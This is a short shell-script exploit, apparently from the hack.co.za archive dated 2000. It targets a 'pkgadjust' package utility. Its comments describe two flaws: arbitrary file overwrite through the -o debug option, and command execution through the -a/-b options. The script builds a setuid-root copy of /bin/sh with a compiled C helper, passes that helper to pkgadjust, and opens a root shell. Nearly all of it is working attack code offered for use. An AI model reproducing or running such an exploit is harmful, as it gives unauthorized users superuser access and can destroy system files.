#!/bin/sh
#
# PROBLEM 1.  pkgadjust will  allow any  user to  overwrite any file
# because it allows one to set via command line:
#
#     -o    write debugging output to <file> rather than to stderr
#
# Since  pkgadjust  does  not  check  for  ownership, etc. this will
# destroy  the  file,  leading  to  a  denial  of service/removal of
# authorization checks.
#
# PROBLEM 2. pkgadjust will allow any user to gain superuser access.
# One can set programs to  list installed packages via command  line
# options.
#
#     -a <cmd> normally 'versions long' command line
#     -b <cmd> normally 'versions -v' command line

cd /tmp
cat > getroot.c << 0wned
int main() { setuid(0); chown("sh",0,0); chmod("sh",04755); return 0; }
0wned
cc getroot.c -o getroot
cp /bin/sh sh
/usr/pkg/bin/pkgadjust -f -a getroot
./sh

#                 www.hack.co.za           [2000]#